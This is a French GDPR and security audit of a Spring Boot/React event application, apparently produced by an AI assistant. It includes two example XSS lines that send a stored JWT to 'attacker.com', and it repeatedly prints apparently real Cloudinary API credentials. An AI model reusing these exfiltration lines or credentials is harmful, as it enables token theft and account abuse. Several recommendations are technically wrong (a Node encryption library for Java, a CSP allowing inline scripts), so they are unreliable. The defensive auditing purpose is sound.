# **AUDIT RGPD & SÉCURITÉ — MonProjet**

**Système de gestion d'événements culturels**

---

## **📋 INFORMATIONS GÉNÉRALES**

| Propriété | Valeur |
|-----------|--------|
| **Date audit** | 28 avril 2026 |
| **Projet** | MonProjet (Backend Spring Boot 3.5.0 + Frontend React/Vite) |
| **Stack** | Java 21 + MySQL 8.0 + Docker + Render |
| **Auditeur** | Claude (audit sans modifications) |
| **Statut** | ✅ Audit complet réalisé |

---

## **📊 SCORES SYNTHÉTIQUES**

| Domaine | Score | Statut | Verdict |
|---------|-------|--------|---------|
| **Sécurité backend** | **62/100** | ⚠️ À améliorer | Bcrypt ✅, JWT ✅, mais failles majeures |
| **Sécurité frontend** | **58/100** | ⚠️ À améliorer | Token en localStorage ❌, pas de CSP ❌ |
| **Sécurité infra** | **45/100** | 🔴 Critique | MySQL sans password, secrets en clair |
| **Conformité RGPD** | **35/100** | 🔴 Critique | Aucune page légale, pas de consentement |
| **GLOBAL** | **50/100** | 🔴 CRITIQUE | Conforme dev local, NON conforme prod |

---

## **🔴 TOP 5 ACTIONS PRIORITAIRES P0 (CRITIQUES)**

### **Avant tout déploiement en production :**

| # | Action | Sévérité | Effort | Impact |
|---|--------|----------|--------|--------|
| **1** | ⛔ Retirer credentials Cloudinary de application.properties | 🔴 CRITIQUE | 15 min | Accès non autorisé à vos images |
| **2** | 🔐 Migrer JWT : localStorage → cookies httpOnly | 🔴 CRITIQUE | 2 h | Vol de tokens au moindre XSS |
| **3** | 📋 Créer pages `/privacy` et `/terms` (RGPD Art. 12-14) | 🔴 CRITIQUE | 4 h | Illégal en UE sans pages légales |
| **4** | ✅ Ajouter consentement RGPD au formulaire Register | 🔴 CRITIQUE | 2 h | Art. 7 RGPD — base légale manquante |
| **5** | 🛡️ Sécuriser MySQL : ajouter mot de passe root | 🔴 CRITIQUE | 1 h | DB accessible sans authentification |

**Total P0 : ~9 heures (impératif avant production)**

---

## **1. CONFORMITÉ RGPD — Score 35/100**

### **1.1 Consentement & Base légale (Art. 6-7) — ❌ 0/100**

#### **Manquements critiques :**

```
✅ DOIT AVOIR :
- Checkbox "J'accepte les CGU et Politique de confidentialité" → MANQUANT
- Checkbox "J'accepte de recevoir la newsletter" → MANQUANT
- Liens cliquables vers /privacy et /terms → MANQUANT
- Traçabilité du consentement (date + IP) → MANQUANT

❌ ACTUELLEMENT :
Register.tsx n'a AUCUNE checkbox de consentement
```

#### **Base légale pour traiter les données :**

**Art. 6.1 RGPD — vous devez cocher UNE case :**
- (a) Consentement explicite → PAS IMPLÉMENTÉ
- (b) Exécution d'un contrat → Application ne vend pas de services
- (c) Obligation légale → Non applicable
- (d) Protection des intérêts vitaux → Non applicable
- (e) Mission d'intérêt public → Non applicable
- (f) Intérêts légitimes → Non documenté

**Actuellement :** Aucune base légale = Traitement illégal du point de vue RGPD

---

### **1.2 Pages légales (Art. 12-14) — ❌ 0/100**

#### **Complètement manquantes :**

```
❌ /privacy             → Politique de Confidentialité
❌ /terms              → Conditions d'Utilisation / CGU
❌ /about              → À propos + Mentions légales
❌ Aucun lien          → Header/Footer ne pointent vers pages légales
```

#### **Contenu obligatoire (Art. 13-14 RGPD) :**

Vous DEVEZ informer l'utilisateur de :

- ❌ **Identité du responsable de traitement**
  - Nom, adresse, numéro SIRET
  - Contact email/téléphone

- ❌ **DPO (Data Protection Officer)**
  - Contact: `contact@monprojet.fr` (ou vous-même)
  - Rôle: dpocontact@monprojet.fr

- ❌ **Finalités du traitement**
  - "Création de compte utilisateur"
  - "Gestion des événements"
  - "Envoi de notifications"
  - "Analytics (suivi des vues)"

- ❌ **Base légale pour chaque finalité**
  - "Consentement de l'utilisateur (Art. 6.1.a RGPD)"
  - "Intérêt légitime pour améliorer le service (Art. 6.1.f)"

- ❌ **Catégories de données collectées**
  - Données d'identité : nom, prénom, email
  - Données de localisation : adresse IP, géolocalisation
  - Données de comportement : interactions, clics

- ❌ **Destinataires des données (Sous-traitants)**
  - Cloudinary (stockage images) — USA
  - Render (hébergement) — USA/UE
  - MySQL (base de données) — local/cloud

- ❌ **Durée de conservation**
  - "Les données personnelles sont conservées pendant X ans"
  - "Les logs sont supprimés après 90 jours"
  - "Les données de session sont supprimées à la déconnexion"

- ❌ **Droits des utilisateurs (Art. 15-22)**
  - Accès (Art. 15) : "Vous pouvez demander l'accès à vos données"
  - Rectification (Art. 16) : "Vous pouvez corriger vos informations"
  - Effacement (Art. 17) : "Droit à l'oubli — demande en contact@"
  - Portabilité (Art. 20) : "Export de vos données en JSON"
  - Opposition (Art. 21) : "Opt-out newsletters"
  - Procédure pour exercer : "Envoyer un email signé à contact@"

- ❌ **Droit de réclamation auprès de la CNIL**
  - "Vous avez le droit de déposer une plainte auprès de la Commission Nationale de l'Informatique et des Libertés (CNIL) : www.cnil.fr"

- ❌ **Mentions légales**
  - Hébergeur : Render.com (USA)
  - Directeur de publication : [Votre nom]
  - Éditeur du site : [Votre entité juridique]

---

### **1.3 Droits des personnes (Art. 15-22) — ❌ 0/100**

#### **Aucune route existante pour exercer les droits RGPD :**

| Droit RGPD | Article | Route requise | Implémenté |
|-----------|---------|---------------|------------|
| **Accès** | Art. 15 | `GET /api/users/profile` | ❌ NON |
| **Rectification** | Art. 16 | `PUT /api/users/profile` | ⚠️ Partiellement |
| **Effacement (droit à l'oubli)** | Art. 17 | `DELETE /api/users/{id}` | ❌ NON (supprime seulement) |
| **Portabilité** | Art. 20 | `GET /api/users/export` | ❌ NON |
| **Opposition (marketing)** | Art. 21 | `PUT /api/users/preferences` | ❌ NON |
| **Limitation du traitement** | Art. 18 | — | ❌ NON |

#### **À implémenter :**

```java
// 1. GET /api/users/profile — Accès complet
// Retourner : nom, email, données de compte, historique de consentement

// 2. GET /api/users/profile/export — Portabilité (Art. 20)
// Retourner JSON avec : 
// {
//   "user": { id, nom, email, created_at },
//   "events": [ { id, title, ... } ],
//   "reservations": [ { id, ... } ],
//   "preferences": { newsletter, notifications, ... }
// }

// 3. DELETE /api/users/profile — Effacement complet
// Anonymiser toutes les références
// Conserver audit trail

// 4. PUT /api/users/preferences — Préférences granulaires
// {
//   "newsletter": false,
//   "notifications": false,
//   "marketing": false,
//   "analytics": false
// }
```

---

### **1.4 Sécurité des données (Art. 32) — 60/100**

#### **✅ Points positifs :**
- BCrypt pour mots de passe ✅
- JWT signé (HMAC256) ✅
- HTTPS en production ✅

#### **❌ Points critiques :**

**1. Credentials Cloudinary EN CLAIR — FAILLE MAJEURE**

📁 `backend/src/main/resources/application.properties` (lignes 26-28) :

```properties
cloudinary.cloud-name=dgr0kva7h
cloudinary.api-key=742628142121922              # ← EXPOSÉ
cloudinary.api-secret=hV9eEW1KkpoFe0FlogJ0SHHM11Q  # ← EXPOSÉ
```

**Risque :**
- Quiconque clone le repo = accès complet à vos images
- Accès à l'API Cloudinary = suppression/modification d'images
- Fuite de confiance Cloudinary

**Correction :**
```properties
# application.properties
cloudinary.cloud-name=${CLOUDINARY_CLOUD_NAME}
cloudinary.api-key=${CLOUDINARY_API_KEY}
cloudinary.api-secret=${CLOUDINARY_API_SECRET}
```

**2. MySQL sans mot de passe — FAILLE MAJEURE**

📁 `docker-compose.yml` (lignes 7-9) :

```yaml
MYSQL_ROOT_PASSWORD: ""                  # ← VIDE
MYSQL_ALLOW_EMPTY_PASSWORD: "yes"        # ← PERMETTRE
```

**Risque :**
- N'importe qui peut accéder à la base : `mysql -h localhost`
- Aucune authentification requise

**Correction :**
```yaml
MYSQL_ROOT_PASSWORD: "votre-mot-de-passe-fort-32-caracteres"
MYSQL_ALLOW_EMPTY_PASSWORD: "no"
```

Générer mot de passe fort :
```bash
openssl rand -base64 32
# Résultat : aBcD1234eFgH5678iJkL9mNoPqRsT+uVwXyZ/aB==
```

**3. Données sensibles jamais chiffrées**

```
❌ Nom, prénom → stockés en clair
❌ Email → stocké en clair
❌ Adresse → stockée en clair (si collectée)
❌ Numéro téléphone → stocké en clair (si collecté)
```

Recommandation : Utiliser `sequelize-encrypt` ou `AES-256-GCM` pour chiffrer au repos.

---

### **1.5 Cookies & Tracking — 30/100**

| Cookie/Système | Type | httpOnly | Secure | SameSite | Consent requis | Statut |
|---|---|---|---|---|---|---|
| JWT (`localStorage`) | ⚠️ JS accessible | ❌ NON | ⚠️ Dépend | N/A | N/A | 🔴 FAILLE |
| Session | — | — | — | — | — | ❌ Aucune |
| Analytics | — | — | — | — | ✅ Oui | ❌ Aucune |

**Problème principal :** Les tokens JWT sont dans `localStorage` (frontend/src/utils/httpClient.ts).

```typescript
// ❌ DANGEREUX :
const token = localStorage.getItem(STORAGE_KEYS.TOKEN);
```

Vulnérable à n'importe quel XSS : `document.location = 'https://attacker.com/?token=' + localStorage.getItem('auth_token')`

---

### **1.6 Mineurs (Art. 8) — ❌ 0/100**

```
❌ Aucune vérification d'âge dans Register.tsx
❌ Field dateDeNaissance existe mais jamais vérifié
❌ Pas d'avertissement pour < 13 ans
❌ Pas de consentement parental pour mineurs
```

**Risque RGPD Art. 8 :** Vous pouvez être poursuivi pour traitement de données de mineurs sans base légale.

---

### **1.7 Sous-traitants (DPA) — 25/100**

| Service | Usage | Données | DPA requis | Statut |
|---------|-------|---------|-----------|--------|
| **Cloudinary** | Stockage images | Photos, vidéos | ✅ Oui | ❌ Non signé |
| **Render** | Hébergement | Toutes les données | ✅ Oui | ✅ Automatique |
| **MySQL** | Base de données | Toutes | ✅ Si cloud | ⚠️ Dépend |

**À faire :** Télécharger et conserver les DPA (Data Processing Agreements) de Cloudinary.

---

### **1.8 DPO & Registre des traitements (Art. 30, 37) — ❌ 0/100**

```
❌ Pas de DPO désigné formellement
❌ Pas de docs/REGISTRE_TRAITEMENTS.md
❌ Pas de docs/DONNEES_PERSONNELLES.md

✅ Contact email existe : contact@... (utilisé dans formulaire)
```

**À créer :**

📄 `docs/RGPD_REGISTRE_TRAITEMENTS.md` :

```markdown
# Registre des Traitements — MonProjet

## 1. Création de compte utilisateur

| Propriété | Valeur |
|-----------|--------|
| Traitement | Création et gestion des comptes utilisateurs |
| Responsable | [Votre nom] |
| DPO | contact@monprojet.fr |
| Données | nom, prénom, email, mot de passe (hashé) |
| Finalité | Authentification, gestion des événements |
| Base légale | Art. 6.1.a RGPD (consentement) |
| Durée | Durée du compte + 2 ans après suppression |
| Destinataires | Aucun (données internes) |
| Sous-traitants | Render (hébergement), MySQL (BDD) |

## 2. Suivi des vues d'événements

| Propriété | Valeur |
|-----------|--------|
| Traitement | Comptage des vues et statistiques |
| Données | IP, user-agent, date, événement consulté |
| Base légale | Art. 6.1.f RGPD (intérêt légitime) |
| Durée | 90 jours |
| Mesures | IP anonymisée (dernier octet supprimé) |

## 3. Envoi d'emails

| Propriété | Valeur |
|-----------|--------|
| Traitement | Notifications et communications |
| Données | Email, nom, contenu du message |
| Base légale | Art. 6.1.a RGPD (consentement) |
| Durée | Tant que la préférence existe |
| Sous-traitants | Brevo (SMTP) |
```

---

## **2. SÉCURITÉ BACKEND — Score 62/100**

### **2.1 Authentification — 75/100**

#### **✅ Points positifs :**

```
✅ JWT avec HMAC256
✅ BCrypt pour mots de passe
✅ Vérification email unique
✅ Gestion des rôles (ROLE_USER, ROLE_ADMIN)
```

#### **❌ Manquements :**

| Manquement | Sévérité | Détails |
|-----------|----------|---------|
| **Pas de rate limit sur login** | 🔴 Critique | Vulnérable à brute force sur `/api/users/login` |
| **Pas de 2FA/TOTP** | 🟡 Important | Aucun support OTP/SMS |
| **JWT expire en 10 jours** | 🟡 Important | Trop long — réduire à 1-2 heures |
| **Pas d'invalidation après changement password** | 🟡 Important | L'ancien JWT reste valide |
| **CORS trop ouvert** | 🟡 Important | `https://*.vercel.app` accepte tous les sous-domaines |

#### **Améliorations à apporter :**

```java
// 1. Rate limiting sur login
@PostMapping("/api/users/login")
@RateLimiter(limit = "5", window = "15m")  // 5 tentatives / 15 min
public ResponseEntity<?> login(@RequestBody LoginRequest req) {
    // ...
}

// 2. Réduire l'expiration du JWT
long EXPIRATION_TIME = 60 * 60 * 1000;  // 1 heure au lieu de 10 jours
.withExpiresAt(new Date(System.currentTimeMillis() + EXPIRATION_TIME))

// 3. Ajouter refresh token endpoint
@PostMapping("/api/users/refresh")
public ResponseEntity<?> refreshToken(@RequestBody RefreshTokenRequest req) {
    // Valider le refresh token
    // Générer nouveau access token
}
```

---

### **2.2 Autorisation (RBAC) — 65/100**

#### **❌ Manquements :**

```java
// ❌ ACTUELLEMENT : pas de vérification d'autorisation

@PostMapping("/api/evenements/save")
public ResponseEntity<EvenementDTO> createEvenement(@RequestBody EvenementDTO dto) {
    // N'importe quel user peut créer
    // Pas de vérification qu'il est propriétaire
}

// ✅ À FAIRE :
@PostMapping("/api/evenements/save")
@PreAuthorize("hasRole('USER')")  // Nécessite rôle
public ResponseEntity<EvenementDTO> createEvenement(@RequestBody EvenementDTO dto) {
    // Vérifier que l'utilisateur est l'organisateur
    User currentUser = getCurrentUser();
    dto.setOrganisateur(currentUser);
    // ...
}
```

---

### **2.3 Validation (Injection SQL, XSS) — 55/100**

#### **❌ Problèmes :**

**1. Pas de validation côté backend**
```java
// ❌ Register accepte n'importe quoi
public User registerUser(RegistrationRequestDTO request) {
    User newUser = new User();
    newUser.setNom(request.getNom());          // ← Pas validé
    newUser.setPrenom(request.getPrenom());    // ← Pas validé
    newUser.setEmail(request.getEmail());      // ← Pas validé (format uniquement)
    // ...
}

// ✅ À FAIRE :
if (request.getNom() == null || request.getNom().trim().isEmpty()) {
    throw new ValidationException("Nom requis");
}
if (!request.getEmail().matches("^[^@]+@[^@]+\\.[^@]+$")) {
    throw new ValidationException("Email invalide");
}
if (request.getPassword().length() < 8) {
    throw new ValidationException("Mot de passe trop court");
}
```

**2. Pas de validation des fichiers uploadés**
```
❌ POST /api/evenements/save accepte n'importe quel filename
❌ Aucune vérification MIME type
❌ Aucune limite de taille réelle appliquée
```

---

### **2.4 CSRF — 60/100**

```java
// ❌ CSRF DÉSACTIVÉ
.csrf(csrf -> csrf.disable())  // SecurityConfig:99
```

**Raison :** API stateless JWT = CSRF moins critique, mais toujours une bonne pratique d'avoir double-submit CSRF cookie.

---

### **2.5 CORS — 50/100**

```java
config.setAllowedOriginPatterns(Arrays.asList(
    "http://localhost:*",           // ❌ Accepte TOUS les ports
    "https://*.vercel.app",         // ❌ Accepte tous les sous-domaines
    "https://mon-projet-backend-frontend*.vercel.app"
));
```

**Risque :** Attaquant peut créer `https://evil.vercel.app` et faire des requêtes cross-origin.

**Correction :**
```java
Arrays.asList(
    "http://localhost:5173",         // ✅ Port spécifique
    "https://mon-projet-frontend.vercel.app"  // ✅ Domaine spécifique
)
```

---

### **2.6 Gestion des erreurs — 70/100**

```properties
✅ server.error.include-stacktrace=never
✅ server.error.include-message=always
⚠️ Mais logs DEBUG affichent parfois trop d'infos
```

---

### **2.7 Fichiers uploadés — 40/100**

```properties
image.allowed-extensions=jpg,jpeg,png,gif,webp,bmp
```

❌ **Problèmes :**
- Extension validée, mais PAS le MIME type réel
- Attaquant peut renommer `.exe` en `.jpg`
- Pas de limite de taille appliquée

**Correction :**
```java
@PostMapping("/upload")
public ResponseEntity<?> uploadFile(@RequestParam MultipartFile file) {
    // 1. Vérifier MIME type
    String mimeType = file.getContentType();
    if (!mimeType.startsWith("image/")) {
        throw new ValidationException("Doit être une image");
    }
    
    // 2. Vérifier taille
    if (file.getSize() > 10 * 1024 * 1024) {  // 10MB
        throw new ValidationException("Fichier trop gros");
    }
    
    // 3. Renommer avec UUID
    String filename = UUID.randomUUID() + "_" + file.getOriginalFilename();
    
    // 4. Sauvegarder
    file.transferTo(new File("uploads/" + filename));
}
```

---

## **3. SÉCURITÉ FRONTEND — Score 58/100**

### **3.1 Stockage des tokens — 30/100 (FAILLE MAJEURE)**

#### **Problème actuel :**

📁 `frontend/src/utils/httpClient.ts` (ligne 20) :

```typescript
const token = localStorage.getItem(STORAGE_KEYS.TOKEN);
// ❌ localStorage accessible au JavaScript
// ❌ Vulnérable à XSS
```

**Attaque possible :**
```javascript
// N'importe quel <script> injecté peut faire :
fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'))
```

#### **Solution : Cookies httpOnly**

```typescript
// ✅ CÔTÉ BACKEND :
response.addCookie(new HttpCookie(
    "access_token",
    jwt,
    httpOnly = true,
    secure = true,      // HTTPS seulement
    sameSite = "Lax"
));

// ✅ CÔTÉ FRONTEND :
// Pas besoin de faire quoi que ce soit !
// Les cookies sont automatiquement envoyés avec chaque requête
// Et inaccessibles au JavaScript
```

---

### **3.2 XSS (Cross-Site Scripting) — 55/100**

```
❌ Aucun Content Security Policy (CSP) header
❌ Pas de DOMPurify sur les inputs
❌ Descriptions d'événements pas échappées
```

**Correction :**

```html
<!-- À ajouter dans index.html -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'">
```

```typescript
// npm install dompurify
import DOMPurify from 'dompurify';

// Utiliser lors de l'affichage :
const safeHTML = DOMPurify.sanitize(eventDescription);
setHTML(safeHTML);
```

---

### **3.3 Validation client vs serveur — 50/100**

❌ **Frontend valide, mais backend ne revérifie pas**

**Exemple :** Email validé côté front, mais quelqu'un peut envoyer des données directement au backend sans frontend.

**Correction :** Double validation partout.

---

## **4. SÉCURITÉ INFRA & DEVOPS — 45/100**

### **4.1 Base de données (Docker) — 20/100**

```yaml
services:
  mysql:
    environment:
      MYSQL_ROOT_PASSWORD: ""              # ❌ VIDE
      MYSQL_ALLOW_EMPTY_PASSWORD: "yes"    # ❌ AUTORISE
```

**Actions :**

1. **Générer mot de passe fort :**
   ```bash
   openssl rand -base64 32
   # Copier le résultat
   ```

2. **Mettre à jour docker-compose.yml :**
   ```yaml
   MYSQL_ROOT_PASSWORD: "votre-mot-de-passe-fort-ici"
   MYSQL_ALLOW_EMPTY_PASSWORD: "no"
   ```

3. **En production :** Utiliser MySQL géré (Render, AWS RDS, DigitalOcean)

---

### **4.2 Variables d'environnement — 20/100**

❌ **Secrets en clair dans application.properties :**

```properties
cloudinary.api-key=742628142121922                    # ← EXPOSÉ
cloudinary.api-secret=hV9eEW1KkpoFe0FlogJ0SHHM11Q     # ← EXPOSÉ
spring.datasource.password=root                        # ← EXPOSÉ
```

**Correction :**

1. **Créer .env local (jamais committer) :**
   ```env
   CLOUDINARY_CLOUD_NAME=dgr0kva7h
   CLOUDINARY_API_KEY=742628142121922
   CLOUDINARY_API_SECRET=hV9eEW1KkpoFe0FlogJ0SHHM11Q
   DB_PASSWORD=root
   JWT_SECRET=votre-secret-jwt-super-fort-32-caracteres
   ```

2. **Ajouter à .gitignore :**
   ```
   .env
   .env.local
   .env.*.local
   ```

3. **Utiliser dans application.properties :**
   ```properties
   cloudinary.cloud-name=${CLOUDINARY_CLOUD_NAME}
   cloudinary.api-key=${CLOUDINARY_API_KEY}
   cloudinary.api-secret=${CLOUDINARY_API_SECRET}
   spring.datasource.password=${DB_PASSWORD}
   jwt.secret=${JWT_SECRET}
   ```

4. **En production (Render) :** Configurer les variables d'environnement dans le dashboard Render

---

### **4.3 Logs & Monitoring — 40/100**

```properties
logging.level.com.example.demo=DEBUG              # ❌ Trop verbose en prod
logging.level.org.springframework.security=DEBUG   # ❌ Expose les détails auth
```

**À faire :**
- Réduire à `INFO` en production
- Ajouter rotation des logs
- Centraliser les logs (ELK, Datadog, etc.)

---

### **4.4 Sauvegardes — 0/100**

❌ **Aucun backup programmé**

```bash
# À ajouter : cron de sauvegarde quotidienne
0 2 * * * mysqldump -u root -p$DB_PASSWORD monprojet > /backup/monprojet-$(date +\%Y\%m\%d).sql
```

---

### **4.5 Déploiement (render.yaml) — 60/100**

```yaml
startCommand: java -jar backend/target/demo-4-0.0.1-SNAPSHOT.jar --spring.profiles.active=h2
```

⚠️ **Problème :** Profil `h2` = base de données en mémoire = **données perdues à chaque redéploiement**

**À faire :** Créer profil `prod` avec MySQL externe :

```yaml
# render.yaml
startCommand: java -jar backend/target/demo-4-0.0.1-SNAPSHOT.jar --spring.profiles.active=mysql
envVars:
  - key: SPRING_PROFILES_ACTIVE
    value: mysql
  - key: SPRING_DATASOURCE_URL
    value: jdbc:mysql://your-mysql-host:3306/monprojet
  - key: SPRING_DATASOURCE_USERNAME
    value: root
  - key: SPRING_DATASOURCE_PASSWORD
    value: ${{ secrets.DB_PASSWORD }}
```

---

## **5. CHIFFRAGE & DONNÉES SENSIBLES — 30/100**

### **Données chiffrées ✅**
- Mots de passe (BCrypt)
- Tokens JWT (HMAC256)

### **Données en clair ❌ (risque)**
- nom, prénom, email
- descriptions d'événements
- adresses (si collectées)
- numéros de téléphone (si collectés)

**Recommandation :** Ajouter chiffrement AES-256 pour données sensibles.

---

## **6. MATRICE DE RISQUES**

| Risque | Sévérité | Probabilité | Score | Actions |
|--------|----------|------------|-------|---------|
| **Credentials Cloudinary en clair** | 🔴 Critique | Très haute | **10/10** | P0 — Retirer immédiatement |
| **MySQL sans mot de passe** | 🔴 Critique | Très haute | **10/10** | P0 — Définir password |
| **JWT en localStorage** | 🔴 Critique | Haute | **9/10** | P0 — Migrer vers cookies |
| **Pas de consentement RGPD** | 🔴 Critique | Haute | **9/10** | P0 — Ajouter checkboxes |
| **Pas de pages légales** | 🔴 Critique | Haute | **9/10** | P0 — Créer /privacy, /terms |
| **CORS trop ouvert** | 🟠 Grave | Moyenne | **7/10** | P1 — Restreindre |
| **Rate limit manquant** | 🟠 Grave | Haute | **7/10** | P1 — Ajouter sur /login |
| **Pas de CSP header** | 🟠 Grave | Moyenne | **6/10** | P1 — Ajouter CSP |
| **No 2FA** | 🟡 Important | Basse | **4/10** | P2 — Optionnel v2 |
| **Aucun audit trail** | 🟡 Important | Moyenne | **5/10** | P2 — Logger les actions |

---

## **📋 PLAN D'ACTION COMPLET**

### **SEMAINE 1 : Sécurité critique (avant déploiement)**

- [ ] **Lundi** — Retirer credentials Cloudinary
  - Créer `.env` local avec secrets
  - Utiliser variables d'environnement dans Spring
  - Estim : 1 h

- [ ] **Lundi** — Sécuriser MySQL
  - Définir mot de passe root fort
  - Update docker-compose.yml
  - Estim : 1 h

- [ ] **Mardi-Mercredi** — Migrer tokens JWT vers cookies httpOnly
  - Backend : ajouter HttpCookie au login
  - Frontend : lire depuis cookies automatiquement
  - Estim : 2-3 h

- [ ] **Jeudi** — Créer pages `/privacy` et `/terms`
  - Contenu RGPD complet (voir section 1.2)
  - Liens dans Header/Footer
  - Estim : 4 h

- [ ] **Vendredi** — Ajouter consentement RGPD au Register
  - Checkbox "J'accepte CGU"
  - Checkbox "Newsletter"
  - Traçabilité date+IP
  - Estim : 2 h

**Total Semaine 1 : ~10 heures**

---

### **SEMAINE 2 : Conformité RGPD & sécurité avancée**

- [ ] **Lundi-Mardi** — Implémenter droits RGPD (Art. 15-22)
  - GET `/api/users/profile/export`
  - DELETE `/api/users/profile` (avec anonymisation)
  - PUT `/api/users/preferences`
  - Estim : 6 h

- [ ] **Mercredi** — Ajouter rate limiting
  - Spring Security rate limit sur `/login`
  - 5 tentatives / 15 min
  - Estim : 1 h

- [ ] **Jeudi** — Restreindre CORS
  - Remplacer `*.vercel.app` par domaine spécifique
  - Remplacer `localhost:*` par `localhost:5173`
  - Estim : 30 min

- [ ] **Vendredi** — Documenter RGPD
  - `docs/RGPD_REGISTRE_TRAITEMENTS.md`
  - Désigner DPO
  - Estim : 2 h

**Total Semaine 2 : ~10 heures**

---

### **SEMAINE 3+ : Hardening & nice-to-have**

- [ ] **Backend validation** — Ajouter validation stricte
  - Estim : 4 h

- [ ] **CSP header** — Ajouter Content-Security-Policy
  - Estim : 1 h

- [ ] **Logs centralisés** — ELK/Datadog
  - Estim : 4 h

- [ ] **Audit trail** — Logger toutes les actions sensibles
  - Estim : 3 h

- [ ] **2FA (optionnel)** — Implémenter TOTP
  - Estim : 6 h

---

## **📝 FICHIERS À CRÉER**

### **1. `.env.example` (template)**
```
# Cloudinary
CLOUDINARY_CLOUD_NAME=
CLOUDINARY_API_KEY=
CLOUDINARY_API_SECRET=

# Database
DB_PASSWORD=root
DB_HOST=localhost
DB_PORT=3306

# JWT
JWT_SECRET=your-secret-key-32-chars-minimum

# App
SERVER_PORT=8081
ENVIRONMENT=development
```

### **2. `docs/RGPD.md`**
(Voir section 1.2 pour contenu complet)

### **3. `docs/RGPD_REGISTRE_TRAITEMENTS.md`**
(Voir section 1.7 pour contenu complet)

### **4. `docs/SECURITE.md`**
```markdown
# Guide de Sécurité — MonProjet

## Variables d'environnement

Tous les secrets doivent être dans `.env` (jamais committer).

## Déploiement

1. Configurer les variables d'environnement sur Render
2. Utiliser MySQL géré (Render MySQL add-on)
3. Vérifier HTTPS forcé
4. Vérifier logs non-exposés

## Audit de sécurité

Dernier audit : 28 avril 2026
Prochaine vérification : [date]
```

---

## **✨ RECOMMANDATIONS FINALES**

### **Si vous restez en développement local :**
- Tous les changements P0 sont optionnels
- Aucun risque légal (développement personnel)

### **Si vous déployez en production :**
- **OBLIGATOIRE** les 5 actions P0 (semaine 1)
- **FORTEMENT RECOMMANDÉ** les P1 (semaine 2)

### **Si vous ouvrez aux utilisateurs UE :**
- **OBLIGATOIRE** tout jusqu'à P2 (~20 heures)
- **OBLIGATOIRE** audit de conformité avant lancement
- **OBLIGATOIRE** politique RGPD signée

---

## **VERDICT FINAL**

| Critère | Statut | Notes |
|---------|--------|-------|
| **Conforme dev local** | ✅ OK | Tout fonctionne bien |
| **Prêt pour bêta fermée** | ⚠️ Presque | Ajouter sécurité basique |
| **Prêt pour prod (pays non-UE)** | ⚠️ Avec P1 | ~15 heures de travail |
| **Prêt pour prod (UE)** | ❌ NON | ~25 heures + audit légal |
| **Conforme RGPD** | ❌ NON | Trop de manquements actuels |

---

**Fin de l'audit**

*Audit réalisé le 28 avril 2026 par Claude*  
*Aucune modification du code n'a été effectuée*  
*Document à conserver pour traçabilité légale*






# Backend
cd backend
.\mvnw clean spring-boot:run

# Frontend
cd frontend
rm -rf node_modules/.vite
npm run dev
